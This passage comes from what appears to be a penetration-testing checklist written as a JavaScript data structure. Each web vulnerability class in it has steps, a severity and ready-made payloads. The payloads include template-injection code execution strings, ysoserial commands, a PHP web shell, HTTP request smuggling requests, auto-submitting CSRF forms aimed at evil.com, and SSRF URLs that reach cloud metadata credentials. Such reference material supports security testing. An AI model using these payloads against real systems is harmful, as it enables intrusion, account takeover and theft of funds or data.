            "Modify item prices or set quantities to negative values before forwarding the request to the server.",
            "Check if total payable amounts update incorrectly."
        ],
        payloads: [
            "price=0.01",
            "quantity=-1"
        ],
        expected: "Successful order placement with altered prices or negative total amounts."
    },
    {
        id: "promo_race_conditions",
        category: "Business Logic",
        title: "Race Conditions in Coupon/Wallet Redemption [Promo Code & Wallet Page]",
        where: "Promo Code & Wallet Page",
        severity: "High",
        steps: [
            "Send a single-use promo code or wallet redemption request to Burp Repeater.",
            "Configure a parallel multi-threaded request attack (e.g., via Turbo Intruder single-packet attack) to redeem the code simultaneously."
        ],
        payloads: [
            "Parallel HTTP/1.1 requests pipeline test via Turbo Intruder"
        ],
        expected: "Multiple successful redemptions from a single-use action."
    },
    {
        id: "webroot_git_exposure",
        category: "Information Disclosure",
        title: "Git Repository & Backup File Exposure (.git, .env) [Web Root / URL Path]",
        where: "Web Root / URL Path",
        severity: "High",
        steps: [
            "Append sensitive file paths or backup archive names to the target domain URL in the browser (e.g., /.git/HEAD, /.env)."
        ],
        payloads: [
            "/.git/HEAD",
            "/.env",
            "/backup.zip",
            "/config.bak"
        ],
        expected: "Successful downloading of source code configurations or repository logs."
    },
    {
        id: "main_portal_clickjacking",
        category: "Clickjacking",
        title: "Clickjacking via Missing Framing Protections (X-Frame-Options) [Main Portal Pages]",
        where: "Main Portal Pages",
        severity: "Medium",
        steps: [
            "Check the HTTP response headers of the main portal pages for framing controls like `X-Frame-Options` or `Content-Security-Policy`.",
            "Create a test HTML file embedding the target site inside an invisible iframe to verify if it renders."
        ],
        payloads: [
            "&lt;iframe src=\"https://target.com\" style=\"opacity:0.0;\"&gt;&lt;/iframe&gt;"
        ],
        expected: "Successful embedding of the application inside an external iframe."
    },
    {
        id: "ws_cswsh",
        category: "WebSockets",
        title: "Cross-Site WebSocket Hijacking (CSWSH) [WebSocket Endpoints (/ws)]",
        where: "WebSocket Endpoints (/ws)",
        severity: "High",
        steps: [
            "Inspect WebSocket handshake requests to check if they validate the `Origin` header and lack anti-CSRF protection.",
            "Host an external script attempting to open a WebSocket connection to the target endpoint."
        ],
        payloads: [
            "&lt;script&gt;var ws = new WebSocket('wss://target.com/ws'); ws.onopen = function() { ws.send('data'); };&lt;/script&gt;"
        ],
        expected: "Unauthenticated WebSocket connection establishment from external origins."
    },
    {
        id: "api_cors_misconfiguration",
        category: "CORS Misconfiguration",
        title: "Overly Permissive CORS Policy with Credentials [API Endpoints & Headers]",
        where: "API Endpoints & Headers",
        severity: "High",
        steps: [
            "Send an API request containing a custom `Origin` header (e.g., Origin: https://evil.com) in Burp Repeater.",
            "Check if the response returns `Access-Control-Allow-Origin: https://evil.com` along with `Access-Control-Allow-Credentials: true`."
        ],
        payloads: [
            "Origin: https://evil.com",
            "Origin: null"
        ],
        expected: "Reflection of untrusted origins alongside credentials permitting cross-origin data theft."
    },
    {
        id: "fund_transfer_race_condition",
        category: "Race Conditions",
        title: "Advanced Limit Over-Redemption Race Condition [Fund Transfer & Voucher API]",
        where: "Fund Transfer & Voucher API",
        severity: "Critical",
        steps: [
            "Target balance withdrawal or voucher redemption APIs.",
            "Launch parallel multi-threaded requests using Turbo Intruder HTTP/2 single-packet attack to synchronize TCP sockets."
        ],
        payloads: [
            "Turbo Intruder HTTP/2 Single-Packet Attack (TCP socket synchronization) "
        ],
        expected: "Successful duplication of funds or exceeding financial limits."
    },
    {
        id: "oauth_state_bypass",
        category: "Auth & Session",
        title: "OAuth 2.0 State Parameter Missing / CSRF [OAuth Callback Endpoint]",
        where: "OAuth Login Flow",
        severity: "High",
        steps: [
            "Initiate the OAuth login flow and intercept the authorization request using Burp Suite.",
            "Remove or omit the `state` parameter from the authorization request URL and forward it to the identity provider."
        ],
        payloads: [
            "Omission of state parameter in /oauth/authorize request",
            "Predictable or static state token reuse"
        ],
        expected: "Successful account takeover or linking via cross-site request forgery on the OAuth callback."
    },
    {
        id: "oauth_redirect_uri_manipulation",
        category: "Auth & Session",
        title: "OAuth 2.0 Open Redirection via Redirect URI [OAuth Authorization Endpoint]",
        where: "OAuth Authorization Endpoint",
        severity: "High",
        steps: [
            "Capture the OAuth authorization request containing the `redirect_uri` parameter.",
            "Modify the `redirect_uri` value to point to an external malicious domain (e.g., https://evil.com)."
        ],
        payloads: [
            "redirect_uri=https://evil.com",
            "redirect_uri=https://trusted.com.evil.com"
        ],
        expected: "Authorization code leakage to an external malicious redirect URI."
    },
    {
        id: "jwt_kid_path_traversal",
        category: "Auth & Session",
        title: "JWT Key ID (kid) Parameter Injection / Path Traversal [Authorization Header]",
        where: "Authorization Header",
        severity: "Critical",
        steps: [
            "Capture a request with a JWT token containing a `kid` (Key ID) header parameter.",
            "Modify the `kid` value to point to a predictable local file path (e.g., /dev/null or an empty file) using traversal sequences."
        ],
        payloads: [
            "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}",
            "{\"alg\":\"HS256\",\"kid\":\"../../../etc/passwd\"}"
        ],
        expected: "Bypassing JWT signature verification via arbitrary file read through the kid parameter."
    },
    {
        id: "saml_signature_wrapping",
        category: "Auth & Session",
        title: "SAML Signature Wrapping Attack [SAML Assertion Consumer Service]",
        where: "SAML Assertion Endpoint",
        severity: "Critical",
        steps: [
            "Capture a valid SAML response XML payload during single sign-on (SSO) authentication using Burp Suite.",
            "Inject a duplicated malicious assertion element into the XML structure while keeping the original signature intact."
        ],
        payloads: [
            "Duplicated &lt;saml:Assertion&gt; nodes with modified user attributes",
            "Altering XML node hierarchy while preserving signature validity"
        ],
        expected: "Authentication bypass or privilege escalation via manipulated SAML assertions."
    },
    {
        id: "session_token_predictability",
        category: "Auth & Session",
        title: "Predictable Session Token Generation [Session Cookie Management]",
        where: "Session Cookies",
        severity: "Critical",
        steps: [
            "Capture multiple sequential session tokens issued by the application upon login.",
            "Analyze the entropy, timestamps, or incremental patterns of the session IDs using statistical tools or Burp Sequencer."
        ],
        payloads: [
            "Sequential session IDs (e.g., session=1001, 1002, 1003)",
            "Weak timestamp-based PRNG session tokens"
        ],
        expected: "Ability to accurately predict or brute-force valid user session tokens."
    },
    {
        id: "graphql_batching_attack",
        category: "API & GraphQL",
        title: "GraphQL Batch Query Abuse & Brute Force [GraphQL Endpoint (/graphql)]",
        where: "GraphQL Endpoint (/graphql)",
        severity: "High",
        steps: [
            "Capture a login or password reset query sent to the GraphQL endpoint.",
            "Format the request body as an array of multiple batched queries to test server-side handling."
        ],
        payloads: [
            "[{\"query\": \"...\"}, {\"query\": \"...\"}, ... 100+ queries]",
            "Array-wrapped brute-force payloads for login checks"
        ],
        expected: "Bypassing rate limits and executing hundreds of parallel authentication attempts in a single HTTP request."
    },
    {
        id: "graphql_field_suggestion",
        category: "API & GraphQL",
        title: "GraphQL Schema Information Disclosure via Field Suggestions [GraphQL Endpoint (/graphql)]",
        where: "GraphQL Endpoint (/graphql)",
        severity: "Low",
        steps: [
            "Send a query with a intentionally misspelled or arbitrary field name to the GraphQL endpoint.",
            "Inspect the error response returned by the server to see if it suggests valid hidden fields."
        ],
        payloads: [
            "query { user { invalidFieldname } }",
            "query { adminPanel } (when hidden)"
        ],
        expected: "Detailed server error messages revealing hidden schema structures and field names."
    },
    {
        id: "rest_api_mass_assignment",
        category: "IDOR & Access",
        title: "REST API Mass Assignment / Object Binding [User Registration API]",
        where: "User Registration API",
        severity: "High",
        steps: [
            "Capture the user registration or account update API request in Burp Suite.",
            "Inject internal administrative fields (e.g., `balance`, `is_admin`, `credits`) into the JSON request body."
        ],
        payloads: [
            "{\"email\": \"test@test.com\", \"balance\": 9999.99}",
            "{\"role\": \"administrator\"}"
        ],
        expected: "Privilege escalation or unauthorized balance crediting via API binding."
    },
    {
        id: "http_request_smuggling_cl_te",
        category: "RCE & Injection",
        title: "HTTP Request Smuggling (CL.TE) [Frontend / Backend Proxy]",
        where: "HTTP Reverse Proxy / Gateway",
        severity: "Critical",
        steps: [
            "Send an ambiguous HTTP request containing both `Content-Length` and `Transfer-Encoding: chunked` headers via Burp Repeater.",
            "Set the Content-Length header to point to a short body while chunked encoding sends a smuggled secondary request prefix."
        ],
        payloads: [
            "POST / HTTP/1.1\nHost: target.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
            "CL.TE header conflict payload sequence"
        ],
        expected: "Request desynchronization allowing cache poisoning or unauthorized request hijacking."
    },
    {
        id: "http_request_smuggling_te_cl",
        category: "RCE & Injection",
        title: "HTTP Request Smuggling (TE.CL) [Frontend / Backend Proxy]",
        where: "HTTP Reverse Proxy / Gateway",
        severity: "Critical",
        steps: [
            "Configure a request where the frontend prioritizes `Content-Length` and the backend prioritizes `Transfer-Encoding`.",
            "Send a chunked payload designed to leave a lingering prefix in the backend socket queue."
        ],
        payloads: [
            "POST / HTTP/1.1\nHost: target.com\nTransfer-Encoding: chunked\nContent-Length: 3\n\n1\nZ\nQ",
            "TE.CL smuggling control sequence"
        ],
        expected: "Backend request queue contamination confirming TE.CL vulnerability."
    },
    {
        id: "cache_poisoning_unkeyed_header",
        category: "Information Disclosure",
        title: "Web Cache Poisoning via Unkeyed Header Injection [Cached Static & Dynamic Pages]",
        where: "Cached Web Pages & CDN",
        severity: "High",
        steps: [
            "Identify a cached response page and inject unkeyed headers like `X-Forwarded-Host` or `X-Original-URL` containing malicious payloads.",
            "Send the request multiple times until the CDN or server caches the poisoned response."
        ],
        payloads: [
            "X-Forwarded-Host: evil.com",
            "X-Host: evil.com (injected into script source links)"
        ],
        expected: "Serving malicious cached content or script injections to arbitrary visitors."
    },
    {
        id: "cache_deception_path",
        category: "Information Disclosure",
        title: "Web Cache Deception [User Account & Dashboard Pages]",
        where: "User Dashboard Pages",
        severity: "High",
        steps: [
            "Append a static file extension or path suffix (e.g., /profile/settings.css or /dashboard/index.js) to a sensitive authenticated page URL."
        ],
        payloads: [
            "/account/profile/nonexistent.css",
            "/api/user/details.js"
        ],
        expected: "Caching and public exposure of private user account data via path confusion."
    },
    {
        id: "ssti_python_jinja2",
        category: "RCE & Injection",
        title: "Server-Side Template Injection (Jinja2 / Python RCE) [User Profile & Report Generator]",
        where: "User Input Rendering Fields",
        severity: "Critical",
        steps: [
            "Identify input fields where user text is dynamically rendered inside Python Jinja2 or Flask templates.",
            "Inject template expressions designed to traverse object classes and execute operating system commands."
        ],
        payloads: [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}"
        ],
        expected: "Arbitrary system command execution via Python template rendering."
    },
    {
        id: "ssti_java_freemarker",
        category: "RCE & Injection",
        title: "Server-Side Template Injection (FreeMarker / Java RCE) [Template Rendering Engine]",
        where: "Java Template Forms",
        severity: "Critical",
        steps: [
            "Locate input fields rendered through Java FreeMarker or Velocity template engines.",
            "Inject utility execution directives leveraging system property lookups or object construction."
        ],
        payloads: [
            "&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt;${ex(\"id\")}",
            "${[].constructor.constructor('java.lang.Runtime').getRuntime().exec('id')}"
        ],
        expected: "Remote code execution on the underlying Java server environment."
    },
    {
        id: "ssti_php_twig",
        category: "RCE & Injection",
        title: "Server-Side Template Injection (Twig / PHP RCE) [Profile & Notification System]",
        where: "PHP Template Inputs",
        severity: "Critical",
        steps: [
            "Find parameters processed by the PHP Twig template engine.",
            "Inject payloads utilizing filter methods or node visitors to execute system functions."
        ],
        payloads: [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{app.request.server.get('HTTP_HOST')}}"
        ],
        expected: "Code execution or information disclosure via Twig template evaluation."
    },
    {
        id: "deserialization_java_ysoserial",
        category: "RCE & Injection",
        title: "Java Deserialization Attack (ysoserial) [API Object Parameters & Cookies]",
        where: "Java API Endpoints & Cookies",
        severity: "Critical",
        steps: [
            "Identify endpoints or cookies accepting serialized Java objects (identified by magic bytes `rO0AB`).",
            "Generate a malicious gadget chain payload using `ysoserial` targeting the application's class path libraries."
        ],
        payloads: [
            "ysoserial CommonsCollections1 'touch /tmp/pwned'",
            "Base64 encoded serialized gadget chain byte stream"
        ],
        expected: "Arbitrary remote code execution via unsafe Java object deserialization."
    },
    {
        id: "deserialization_php_object",
        category: "RCE & Injection",
        title: "PHP Object Injection [Cookie & Parameter Inputs]",
        where: "PHP Application Parameters",
        severity: "Critical",
        steps: [
            "Locate parameters or cookies processing serialized PHP strings (starting with `O:` or `a:`).",
            "Construct a malicious PHP object leveraging magic methods like `__destruct()` or `__wakeup()` in application classes."
        ],
        payloads: [
            "O:8:\"Exploit\":0:{}",
            "a:1:{s:4:\"test\";O:10:\"CustomClass\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}}"
        ],
        expected: "Execution of unintended class methods or code execution via PHP magic methods."
    },
    {
        id: "deserialization_dotnet_formatter",
        category: "RCE & Injection",
        title: ".NET Binary Formatter Deserialization [ViewState & API Inputs]",
        where: ".NET ViewState / API Endpoints",
        severity: "Critical",
        steps: [
            "Identify .NET applications processing serialized ViewState or binary formatter objects.",
            "Generate a payload using tools like `ysoserial.net` with formatters like LosFormatter or BinaryFormatter."
        ],
        payloads: [
            "ysoserial.net -f ObjectDataProvider -g Cmd -c \"calc.exe\"",
            "Manipulated .NET ViewState payload string"
        ],
        expected: "Arbitrary command execution on the Windows .NET server environment."
    },
    {
        id: "cors_null_origin_exploit",
        category: "CORS Misconfiguration",
        title: "CORS Misconfiguration via Null Origin Reflection [API Endpoints]",
        where: "API Endpoints & Headers",
        severity: "High",
        steps: [
            "Send an API request with `Origin: null` header in Burp Repeater.",
            "Check if the server response returns `Access-Control-Allow-Origin: null` alongside `Access-Control-Allow-Credentials: true`."
        ],
        payloads: [
            "Origin: null",
            "&lt;iframe srcdoc=\"&lt;script&gt;fetch('https://target.com/api/user', {credentials:'include'}).then(r=&gt;r.text()).then(alert);&lt;/script&gt;\"&gt;&lt;/iframe&gt;"
        ],
        expected: "Successful cross-origin data theft from sandboxed or redirected frames."
    },
    {
        id: "cors_wildcard_credentials_check",
        category: "CORS Misconfiguration",
        title: "CORS Wildcard with Credentials Misconfiguration [API Gateway Headers]",
        where: "API Endpoints",
        severity: "High",
        steps: [
            "Inspect API response headers for `Access-Control-Allow-Origin: *` configured simultaneously with `Access-Control-Allow-Credentials: true`.",
            "Verify browser behavior or test cross-origin requests from an external domain to confirm policy acceptance."
        ],
        payloads: [
            "Access-Control-Allow-Origin: *",
            "Access-Control-Allow-Credentials: true"
        ],
        expected: "Browser policy violation or improper wildcard permission configuration allowing session data exposure."
    },
    {
        id: "websocket_origin_bypass",
        category: "WebSockets",
        title: "WebSocket Handshake Origin Bypass [WebSocket Server Endpoint]",
        where: "WebSocket Handshake",
        severity: "High",
        steps: [
            "Capture a WebSocket connection handshake request in Burp Suite.",
            "Modify the `Origin` header to an external domain (e.g., Origin: https://evil.com) and forward the request.",
            "Check if the server completes the handshake with a `101 Switching Protocols` response status code."
        ],
        payloads: [
            "Origin: https://evil.com",
            "Origin: http://localhost"
        ],
        expected: "Establishment of an unvalidated cross-origin WebSocket connection."
    },
    {
        id: "prototype_pollution_server_nodejs",
        category: "Prototype Pollution",
        title: "Server-Side Prototype Pollution in Node.js [Express API Endpoint Inputs]",
        where: "Node.js API JSON Body",
        severity: "Critical",
        steps: [
            "Send a JSON payload containing `__proto__` or `constructor.prototype` properties to a Node.js Express API endpoint.",
            "Check if object merging or recursive cloning functions (like lodash merge) modify global Object prototypes."
        ],
        payloads: [
            "{\"__proto__\": {\"isAdmin\": true}}",
            "{\"constructor\": {\"prototype\": {\"polluted\": true}}}"
        ],
        expected: "Global object prototype modification leading to logic bypasses or remote code execution."
    },
    {
        id: "prototype_pollution_dom_sink",
        category: "Prototype Pollution",
        title: "DOM-Based Prototype Pollution via URL Query Parameters [Client-Side JS]",
        where: "Client-Side Query Parameters",
        severity: "High",
        steps: [
            "Inject prototype pollution query parameters into the target application URL.",
            "Inspect client-side JavaScript execution flows to see if properties like `__proto__[source]` reach insecure DOM sinks (e.g., innerHTML or script evaluation)."
        ],
        payloads: [
            "/?__proto__[url]=//evil.com/script.js",
            "/?__proto__[allowedTags][]=script"
        ],
        expected: "Client-side script execution or DOM manipulation via polluted object properties."
    },
    {
        id: "mass_assignment_user_roles",
        category: "IDOR & Access",
        title: "Mass Assignment / Privilege Escalation via User Settings [Account Settings API]",
        where: "Account Settings Update Form",
        severity: "Critical",
        steps: [
            "Capture the request sent when updating standard user profile settings.",
            "Add high-privilege parameters like `\"is_admin\": true`, `\"group\": \"administrators\"`, or `\"permissions\": 7` into the request body."
        ],
        payloads: [
            "{\"is_admin\": true}",
            "{\"role_id\": 1, \"account_status\": \"active\"}"
        ],
        expected: "Unauthorized privilege escalation to administrator role via mass assignment."
    },
    {
        id: "mass_assignment_password_reset",
        category: "Auth & Session",
        title: "Mass Assignment in Password Reset API [Password Reset Endpoint]",
        where: "Password Reset API",
        severity: "Critical",
        steps: [
            "Capture the password reset confirmation API request.",
            "Inject additional parameters such as `\"password_reset_token\"` or `\"user_id\"` into the request payload to target other accounts."
        ],
        payloads: [
            "{\"token\": \"valid_token\", \"user_id\": 1, \"new_password\": \"hacked\"}",
            "{\"email\": \"victim@target.com\", \"password\": \"hacked\"}"
        ],
        expected: "Unauthorized password modification of other users via parameter pollution."
    },
    {
        id: "broken_object_level_auth_files",
        category: "IDOR & Access",
        title: "Broken Object Level Authorization (BOLA) on Document Files [File Download API]",
        where: "File Download API Endpoints",
        severity: "Critical",
        steps: [
            "Log into the application and capture a file download or document retrieval request (e.g., /api/documents/105).",
            "Modify the document ID parameter to sequential or predictable numbers belonging to other users."
        ],
        payloads: [
            "/api/documents/105 to /api/documents/106",
            "/download?file_id=uuid-string-of-another-user"
        ],
        expected: "Unauthorized downloading and viewing of confidential files belonging to other users."
    },
    {
        id: "broken_function_level_auth_api",
        category: "IDOR & Access",
        title: "Missing Function Level Access Control on Admin APIs [Internal Admin API Routes]",
        where: "Admin API Endpoints",
        severity: "High",
        steps: [
            "Log into the application using a standard, low-privilege customer account.",
            "Send direct HTTP POST/DELETE requests to sensitive administrative API routes (e.g., /api/v1/admin/users/delete) using Burp Repeater."
        ],
        payloads: [
            "DELETE /api/v1/admin/users/1",
            "POST /api/v1/admin/settings/update"
        ],
        expected: "Successful execution of restricted administrative API operations by low-privilege users."
    },
    {
        id: "idor_password_hash_retrieval",
        category: "IDOR & Access",
        title: "IDOR for Sensitive User Data / Password Hash Retrieval [User Profile Lookup API]",
        where: "User Profile Lookup API",
        severity: "Critical",
        steps: [
            "Capture an API request that fetches user profile details.",
            "Modify the user identifier parameter to query other accounts."
        ],
        payloads: [
            "/api/users/profile?id=2",
            "/api/v1/account/export?user_id=5"
        ],
        expected: "Exposure of sensitive authentication hashes or private user PII via IDOR."
    },
    {
        id: "idor_address_book_manipulation",
        category: "IDOR & Access",
        title: "IDOR in Shipping Address Book Management [Checkout Address API]",
        where: "Shipping Address API",
        severity: "Medium",
        steps: [
            "Log in and add a shipping address, capturing the update request in Burp Suite.",
            "Modify the address ID reference to target another user's address identifier."
        ],
        payloads: [
            "PUT /api/address/501 (modifying another user's address ID)",
            "DELETE /api/address/502"
        ],
        expected: "Unauthorized modification or deletion of shipping records belonging to other users."
    },
    {
        id: "idor_coupon_redemption",
        category: "IDOR & Access",
        title: "IDOR / Unauthorized Access to User Vouchers [Wallet & Voucher API]",
        where: "Voucher Redemption API",
        severity: "High",
        steps: [
            "Capture the request claiming a promotional voucher or user reward.",
            "Modify the user or voucher reference ID to claim rewards assigned to other user accounts."
        ],
        payloads: [
            "POST /api/voucher/claim with manipulated user_id parameter",
            "GET /api/rewards/transfer?target_id=10"
        ],
        expected: "Unauthorized claiming or transferring of vouchers belonging to other accounts."
    },
    {
        id: "csrf_json_content_type",
        category: "CSRF",
        title: "Cross-Site Request Forgery via Content-Type Trickery [JSON API Endpoints]",
        where: "State-Changing JSON APIs",
        severity: "High",
        steps: [
            "Test state-changing JSON endpoints to see if they accept form-urlencoded requests when the `Content-Type` header is modified."
        ],
        payloads: [
            "&lt;form action='https://target.com/api/update' method='POST'&gt;&lt;input name='{\"email\":\"evil@evil.com\"}' value=''&gt;&lt;/form&gt;",
            "Content-Type bypass via text/plain submission"
        ],
        expected: "Unauthorized state changes on JSON endpoints via cross-site form submissions."
    },
    {
        id: "csrf_missing_token_api",
        category: "CSRF",
        title: "Missing Anti-CSRF Token on Critical Settings [Account Settings Form]",
        where: "Account Security Settings",
        severity: "High",
        steps: [
            "Inspect the HTML form or API request for updating critical settings (e.g., email, password, 2FA) for the absence of anti-CSRF tokens."
        ],
        payloads: [
            "&lt;form action='https://target.com/settings/email' method='POST'&gt;&lt;input type='hidden' name='email' value='attacker@evil.com'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;"
        ],
        expected: "Unauthorized modification of victim account settings via cross-site request forgery."
    },
    {
        id: "csrf_lax_samesite_cookie",
        category: "CSRF",
        title: "CSRF Exploitation via Lax SameSite Cookie Default [State Changing POST APIs]",
        where: "State-Changing POST Endpoints",
        severity: "Medium",
        steps: [
            "Inspect session cookies to check if they rely on `SameSite=Lax` or have no SameSite attribute specified."
        ],
        payloads: [
            "&lt;form action='https://target.com/transfer' method='POST'&gt;&lt;input name='amount' value='1000'&gt;&lt;/form&gt;",
            "Cross-site POST triggering state change with Lax cookies"
        ],
        expected: "Successful execution of state-changing operations due to loose cookie SameSite restrictions."
    },
    {
        id: "ssrf_dns_rebinding_metadata",
        category: "SSRF",
        title: "Advanced SSRF via DNS Rebinding [URL Preview Fetcher]",
        where: "URL Preview Fetcher",
        severity: "Critical",
        steps: [
            "Configure a custom DNS rebinding domain that resolves to an external public IP on the first lookup and an internal IP (169.254.169.254) on the second lookup."
        ],
        payloads: [
            "http://rebind.network/latest/meta-data/iam/security-credentials/",
            "http://127.0.0.1.rebind.network:8080/"
        ],
        expected: "Bypassing domain filters to expose cloud metadata or internal service endpoints."
    },
    {
        id: "ssrf_ipv6_bypass",
        category: "SSRF",
        title: "SSRF Bypass via IPv6 Loopback / Localhost Encoding [Webhook Service]",
        where: "Webhook URL Input",
        severity: "High",
        steps: [
            "Supply alternative representations of localhost or internal IP addresses into webhook URL inputs (e.g., IPv6 `[::1]`, decimal IP `2130706433`, or octal representations)."
        ],
        payloads: [
            "http://[::1]/",
            "http://0x7f000001/",
            "http://127.0.0.1:80@evil.com"
        ],
        expected: "Bypassing IP restriction filters to access internal network services."
    },
    {
        id: "ssrf_pdf_generator_local_file",
        category: "SSRF",
        title: "Local File Inclusion & SSRF via PDF Generator [Invoice Export Feature]",
        where: "PDF Export Generator",
        severity: "Critical",
        steps: [
            "Inject HTML iframe or image tags pointing to local file URIs (file:///etc/passwd) into user-supplied fields that get rendered into PDFs."
        ],
        payloads: [
            "&lt;iframe src=\"file:///etc/passwd\" width=\"100%\" height=\"500px\"&gt;&lt;/iframe&gt;",
            "&lt;img src=\"file:///c:/windows/win.ini\"&gt;"
        ],
        expected: "Leaked local system file contents rendered inside the exported PDF document."
    },
    {
        id: "file_upload_zip_slip",
        category: "File Upload",
        title: "Arbitrary File Write via ZIP Slip Archive Extraction [Document Upload Form]",
        where: "ZIP Archive Upload Portal",
        severity: "Critical",
        steps: [
            "Craft a malicious ZIP archive containing file entries with path traversal filenames (e.g., `../../../../var/www/html/shell.php`)."
        ],
        payloads: [
            "Archive entry name: ../../../../var/www/html/exploit.php",
            "ZIP slip payload structure generated via evilarc"
        ],
        expected: "Arbitrary file write leading to remote code execution on the server."
    },
    {
        id: "file_upload_htaccess_override",
        category: "File Upload",
        title: "Unrestricted File Upload via .htaccess / Web Server Config Override [Upload Form]",
        where: "File Upload Portal",
        severity: "High",
        steps: [
            "Upload a customized `.htaccess` configuration file that maps arbitrary file extensions (e.g., .jpg or .txt) to execute as PHP scripts."
        ],
        payloads: [
            ".htaccess content: AddType application/x-httpd-php .jpg",
            "shell.jpg containing &lt;?php system($_GET['cmd']); ?&gt;"
        ],
        expected: "Bypassing extension restrictions and achieving remote code execution via config overrides."
    },
    {
        id: "file_upload_polyglot_image",
        category: "File Upload",
        title: "Polyglot File Upload / Image XSS [Avatar & Image Upload Form]",
        where: "Profile Avatar Upload",
        severity: "High",
        steps: [
            "Create a valid image file (PNG/JPEG) containing embedded JavaScript code within its comment section or metadata tags (Polyglot file)."
        ],
        payloads: [
            "PNG/GIF polyglot image embedding &lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "EXIF metadata injection with HTML payload tags"
        ],
        expected: "Script execution in the browser when rendering the uploaded polyglot image."
    },
    {
        id: "business_logic_negative_transfer",
        category: "Business Logic",
        title: "Business Logic Flaw: Negative Fund Transfer [Wallet & Banking API]",
        where: "Fund Transfer API",
        severity: "Critical",
        steps: [
            "Capture the money transfer or wallet deposit request in Burp Suite.",
            "Modify the transfer amount parameter to a negative number (e.g., amount=-500)."
        ],
        payloads: [
            "amount=-500.00",
            "transfer_funds=-1000"
        ],
        expected: "Successful financial balance manipulation via negative values."
    },
    {
        id: "business_logic_integer_overflow",
        category: "Business Logic",
        title: "Integer Overflow / Boundary Flaw in Cart Quantity [E-Commerce Checkout]",
        where: "Cart Quantity Update API",
        severity: "High",
        steps: [
            "Capture the cart item quantity update request.",
            "Input an extremely large integer exceeding 32-bit integer limits (e.g., 2147483650) to trigger an integer overflow."
        ],
        payloads: [
            "quantity=999999999999",
            "item_count=2147483648"
        ],
        expected: "Price calculation failure or negative totals resulting from integer overflow."
    },
    {
        id: "business_logic_workflow_bypass_steps",
        category: "Business Logic",
        title: "Checkout Workflow Bypass via Direct URL / API Access [Multi-Step Checkout]",
        where: "Checkout Flow APIs",
        severity: "Medium",
        steps: [
            "Add items to the cart and capture the final order confirmation or payment completion API endpoint."
        ],
        payloads: [
            "Direct POST to /api/v1/checkout/finalize omitting payment_token parameter",
            "Skipping wizard step validation checks"
        ],
        expected: "Successfully placing orders without completing prerequisite payment steps."
    },
    {
        id: "race_condition_coupon_double",
        category: "Race Conditions",
        title: "Race Condition in Single-Use Coupon Application [Cart Checkout Page]",
        where: "Coupon Application API",
        severity: "High",
        steps: [
            "Add an item to the cart and send a single-use coupon application request to Burp Repeater."
        ],
        payloads: [
            "Turbo Intruder HTTP/1.2 Single-Packet Attack pipeline targeting /apply-coupon"
        ],
        expected: "Multiple discount applications from a single-use promotional code."
    },
    {
        id: "race_condition_gift_card",
        category: "Race Conditions",
        title: "Race Condition in Gift Card Redemption / Balance Duplication [Wallet Page]",
        where: "Gift Card Redemption API",
        severity: "Critical",
        steps: [
            "Capture a gift card redemption request in Burp Repeater."
        ],
        payloads: [
            "Parallel thread testing via Turbo Intruder for /redeem-giftcard"
        ],
        expected: "Duplicating gift card funds or wallet balance via concurrent race conditions."
    },
    {
        id: "info_disclosure_debug_endpoint",
        category: "Information Disclosure",
        title: "Information Disclosure via Exposed Actuator / Debug Endpoints [Spring Boot / API Paths]",
        where: "Server Root / Actuator Paths",
        severity: "High",
        steps: [
            "Append common debug, actuator, or health-check paths to the target domain URL in the browser (e.g., /actuator/env, /metrics, /swagger-ui.html)."
        ],
        payloads: [
            "/actuator/env",
            "/actuator/mappings",
            "/debug/vars",
            "/server-status"
        ],
        expected: "Exposure of sensitive environment properties, internal routes, or system configurations."
    },
    {
        id: "info_disclosure_source_map",
        category: "Information Disclosure",
        title: "Source Map File Exposure Revealing Frontend Source Code [JavaScript Bundle Paths]",
        where: "Static JS Asset Paths",
        severity: "Low",
        steps: [
            "Append `.map` extensions to compiled JavaScript asset filenames linked on the main portal pages (e.g., /static/js/main.js.map)."
        ],
        payloads: [
            "/static/js/main.chunk.js.map",
            "/dist/bundle.js.map"
        ],
        expected: "Full disclosure of unminified frontend source code and proprietary internal API routes."
    },
    {
        id: "info_disclosure_phpinfo",
        category: "Information Disclosure",
        title: "PHPInfo Page Exposure [Web Root / Utility Paths]",
        where: "Web Root Path",
        severity: "Medium",
        steps: [
            "Try accessing common PHP info script filenames in the web root directory."
        ],
        payloads: [
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/i.php"
        ],
        expected: "Detailed disclosure of PHP configuration parameters and server system paths."
    },
    {
        id: "open_redirect_header_location",
        category: "Open Redirect",
        title: "Open Redirection via Location Header Injection [HTTP Redirect API]",
        where: "Redirect API Endpoints",
        severity: "Medium",
        steps: [
            "Locate API endpoints that accept redirect query parameters (e.g., /redirect?url=)."
        ],
        payloads: [
            "/redirect?url=https://evil.com",
            "/goto?target=//evil.com",
            "/exit?dest=javascript:alert(1)"
        ],
        expected: "Unvalidated redirection to external malicious URLs."
    },
    {
        id: "clickjacking_csp_missing",
        category: "Clickjacking",
        title: "Clickjacking via Missing Content Security Policyframe Ancestors [Portal Pages]",
        where: "Main Application Pages",
        severity: "Medium",
        steps: [
            "Inspect HTTP response headers for `Content-Security-Policy` with `frame-ancestors` directive or `X-Frame-Options`."
        ],
        payloads: [
            "&lt;iframe src=\"https://target.com\" style=\"opacity:0.0; position:absolute; width:500px; height:500px;\"&gt;&lt;/iframe&gt;"
        ],
        expected: "Successful embedding of the target application inside a malicious iframe layer."
    },
    {
        id: "graphql_query_depth_dos",
        category: "API & GraphQL",
        title: "GraphQL Denial of Service via Deeply Nested Queries [GraphQL Endpoint]",
        where: "GraphQL Endpoint (/graphql)",
        severity: "High",
        steps: [
            "Send a GraphQL query containing excessively deep nested object selections (e.g., user -> posts -> author -> posts -> author...)."
        ],
        payloads: [
            "query { user { posts { author { posts { author { posts { name } } } } } } }"
        ],
        expected: "Server performance exhaustion or application crash due to unbounded query nesting."
    },
    {
        id: "client_prototype_pollution_querystring",
        category: "Prototype Pollution",
        title: "Client-Side Prototype Pollution via Query String Parsing [Client JS]",
        where: "URL Query Parameters",
